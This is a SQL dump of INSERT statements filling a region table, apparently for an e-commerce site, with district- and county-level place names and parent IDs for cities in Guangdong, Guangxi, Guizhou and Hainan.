INSERT INTO `ec22703249_region` VALUES ('693', '76', '天河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('694', '76', '东山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('695', '76', '白云区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('696', '76', '海珠区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('697', '76', '荔湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('698', '76', '越秀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('699', '76', '黄埔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('700', '76', '番禺区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('701', '76', '花都区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('702', '76', '增城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('703', '76', '从化区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('704', '76', '市郊', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('705', '77', '福田区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('706', '77', '罗湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('707', '77', '南山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('708', '77', '宝安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('709', '77', '龙岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('710', '77', '盐田区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('711', '78', '湘桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('712', '78', '潮安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('713', '78', '饶平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('714', '79', '南城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('715', '79', '东城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('716', '79', '万江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('717', '79', '莞城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('718', '79', '石龙镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('719', '79', '虎门镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('720', '79', '麻涌镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('721', '79', '道滘镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('722', '79', '石碣镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('723', '79', '沙田镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('724', '79', '望牛墩镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('725', '79', '洪梅镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('726', '79', '茶山镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('727', '79', '寮步镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('728', '79', '大岭山镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('729', '79', '大朗镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('730', '79', '黄江镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('731', '79', '樟木头', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('732', '79', '凤岗镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('733', '79', '塘厦镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('734', '79', '谢岗镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('735', '79', '厚街镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('736', '79', '清溪镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('737', '79', '常平镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('738', '79', '桥头镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('739', '79', '横沥镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('740', '79', '东坑镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('741', '79', '企石镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('742', '79', '石排镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('743', '79', '长安镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('744', '79', '中堂镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('745', '79', '高埗镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('746', '80', '禅城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('747', '80', '南海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('748', '80', '顺德区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('749', '80', '三水区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('750', '80', '高明区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('751', '81', '东源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('752', '81', '和平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('753', '81', '源城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('754', '81', '连平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('755', '81', '龙川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('756', '81', '紫金县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('757', '82', '惠阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('758', '82', '惠城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('759', '82', '大亚湾', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('760', '82', '博罗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('761', '82', '惠东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('762', '82', '龙门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('763', '83', '江海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('764', '83', '蓬江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('765', '83', '新会区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('766', '83', '台山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('767', '83', '开平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('768', '83', '鹤山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('769', '83', '恩平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('770', '84', '榕城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('771', '84', '普宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('772', '84', '揭东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('773', '84', '揭西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('774', '84', '惠来县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('775', '85', '茂南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('776', '85', '茂港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('777', '85', '高州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('778', '85', '化州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('779', '85', '信宜市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('780', '85', '电白县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('781', '86', '梅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('782', '86', '梅江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('783', '86', '兴宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('784', '86', '大埔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('785', '86', '丰顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('786', '86', '五华县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('787', '86', '平远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('788', '86', '蕉岭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('789', '87', '清城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('790', '87', '英德市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('791', '87', '连州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('792', '87', '佛冈县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('793', '87', '阳山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('794', '87', '清新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('795', '87', '连山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('796', '87', '连南', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('797', '88', '南澳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('798', '88', '潮阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('799', '88', '澄海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('800', '88', '龙湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('801', '88', '金平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('802', '88', '濠江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('803', '88', '潮南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('804', '89', '城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('805', '89', '陆丰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('806', '89', '海丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('807', '89', '陆河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('808', '90', '曲江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('809', '90', '浈江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('810', '90', '武江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('811', '90', '曲江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('812', '90', '乐昌市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('813', '90', '南雄市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('814', '90', '始兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('815', '90', '仁化县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('816', '90', '翁源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('817', '90', '新丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('818', '90', '乳源', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('819', '91', '江城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('820', '91', '阳春市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('821', '91', '阳西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('822', '91', '阳东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('823', '92', '云城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('824', '92', '罗定市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('825', '92', '新兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('826', '92', '郁南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('827', '92', '云安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('828', '93', '赤坎区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('829', '93', '霞山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('830', '93', '坡头区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('831', '93', '麻章区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('832', '93', '廉江市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('833', '93', '雷州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('834', '93', '吴川市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('835', '93', '遂溪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('836', '93', '徐闻县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('837', '94', '肇庆市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('838', '94', '高要市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('839', '94', '四会市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('840', '94', '广宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('841', '94', '怀集县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('842', '94', '封开县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('843', '94', '德庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('844', '95', '石岐街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('845', '95', '东区街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('846', '95', '西区街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('847', '95', '环城街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('848', '95', '中山港街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('849', '95', '五桂山街道', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('850', '96', '香洲区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('851', '96', '斗门区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('852', '96', '金湾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('853', '97', '邕宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('854', '97', '青秀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('855', '97', '兴宁区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('856', '97', '良庆区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('857', '97', '西乡塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('858', '97', '江南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('859', '97', '武鸣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('860', '97', '隆安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('861', '97', '马山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('862', '97', '上林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('863', '97', '宾阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('864', '97', '横县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('865', '98', '秀峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('866', '98', '叠彩区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('867', '98', '象山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('868', '98', '七星区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('869', '98', '雁山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('870', '98', '阳朔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('871', '98', '临桂县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('872', '98', '灵川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('873', '98', '全州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('874', '98', '平乐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('875', '98', '兴安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('876', '98', '灌阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('877', '98', '荔浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('878', '98', '资源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('879', '98', '永福县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('880', '98', '龙胜', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('881', '98', '恭城', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('882', '99', '右江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('883', '99', '凌云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('884', '99', '平果县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('885', '99', '西林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('886', '99', '乐业县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('887', '99', '德保县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('888', '99', '田林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('889', '99', '田阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('890', '99', '靖西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('891', '99', '田东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('892', '99', '那坡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('893', '99', '隆林', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('894', '100', '海城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('895', '100', '银海区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('896', '100', '铁山港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('897', '100', '合浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('898', '101', '江州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('899', '101', '凭祥市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('900', '101', '宁明县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('901', '101', '扶绥县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('902', '101', '龙州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('903', '101', '大新县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('904', '101', '天等县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('905', '102', '港口区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('906', '102', '防城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('907', '102', '东兴市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('908', '102', '上思县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('909', '103', '港北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('910', '103', '港南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('911', '103', '覃塘区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('912', '103', '桂平市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('913', '103', '平南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('914', '104', '金城江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('915', '104', '宜州市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('916', '104', '天峨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('917', '104', '凤山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('918', '104', '南丹县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('919', '104', '东兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('920', '104', '都安', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('921', '104', '罗城', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('922', '104', '巴马', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('923', '104', '环江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('924', '104', '大化', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('925', '105', '八步区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('926', '105', '钟山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('927', '105', '昭平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('928', '105', '富川', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('929', '106', '兴宾区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('930', '106', '合山市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('931', '106', '象州县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('932', '106', '武宣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('933', '106', '忻城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('934', '106', '金秀', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('935', '107', '城中区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('936', '107', '鱼峰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('937', '107', '柳北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('938', '107', '柳南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('939', '107', '柳江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('940', '107', '柳城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('941', '107', '鹿寨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('942', '107', '融安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('943', '107', '融水', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('944', '107', '三江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('945', '108', '钦南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('946', '108', '钦北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('947', '108', '灵山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('948', '108', '浦北县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('949', '109', '万秀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('950', '109', '蝶山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('951', '109', '长洲区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('952', '109', '岑溪市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('953', '109', '苍梧县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('954', '109', '藤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('955', '109', '蒙山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('956', '110', '玉州区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('957', '110', '北流市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('958', '110', '容县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('959', '110', '陆川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('960', '110', '博白县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('961', '110', '兴业县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('962', '111', '南明区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('963', '111', '云岩区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('964', '111', '花溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('965', '111', '乌当区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('966', '111', '白云区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('967', '111', '小河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('968', '111', '金阳新区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('969', '111', '新天园区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('970', '111', '清镇市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('971', '111', '开阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('972', '111', '修文县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('973', '111', '息烽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('974', '112', '西秀区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('975', '112', '关岭', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('976', '112', '镇宁', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('977', '112', '紫云', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('978', '112', '平坝县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('979', '112', '普定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('980', '113', '毕节市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('981', '113', '大方县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('982', '113', '黔西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('983', '113', '金沙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('984', '113', '织金县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('985', '113', '纳雍县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('986', '113', '赫章县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('987', '113', '威宁', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('988', '114', '钟山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('989', '114', '六枝特区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('990', '114', '水城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('991', '114', '盘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('992', '115', '凯里市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('993', '115', '黄平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('994', '115', '施秉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('995', '115', '三穗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('996', '115', '镇远县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('997', '115', '岑巩县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('998', '115', '天柱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('999', '115', '锦屏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1000', '115', '剑河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1001', '115', '台江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1002', '115', '黎平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1003', '115', '榕江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1004', '115', '从江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1005', '115', '雷山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1006', '115', '麻江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1007', '115', '丹寨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1008', '116', '都匀市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1009', '116', '福泉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1010', '116', '荔波县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1011', '116', '贵定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1012', '116', '瓮安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1013', '116', '独山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1014', '116', '平塘县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1015', '116', '罗甸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1016', '116', '长顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1017', '116', '龙里县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1018', '116', '惠水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1019', '116', '三都', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1020', '117', '兴义市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1021', '117', '兴仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1022', '117', '普安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1023', '117', '晴隆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1024', '117', '贞丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1025', '117', '望谟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1026', '117', '册亨县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1027', '117', '安龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1028', '118', '铜仁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1029', '118', '江口县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1030', '118', '石阡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1031', '118', '思南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1032', '118', '德江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1033', '118', '玉屏', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1034', '118', '印江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1035', '118', '沿河', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1036', '118', '松桃', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1037', '118', '万山特区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1038', '119', '红花岗区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1039', '119', '务川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1040', '119', '道真县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1041', '119', '汇川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1042', '119', '赤水市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1043', '119', '仁怀市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1044', '119', '遵义县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1045', '119', '桐梓县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1046', '119', '绥阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1047', '119', '正安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1048', '119', '凤冈县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1049', '119', '湄潭县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1050', '119', '余庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1051', '119', '习水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1052', '119', '道真', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1053', '119', '务川', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1054', '120', '秀英区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1055', '120', '龙华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1056', '120', '琼山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1057', '120', '美兰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1058', '137', '市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1059', '137', '洋浦开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1060', '137', '那大镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1061', '137', '王五镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1062', '137', '雅星镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1063', '137', '大成镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1064', '137', '中和镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1065', '137', '峨蔓镇', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('1066', '137', '南丰镇', '3', '0');
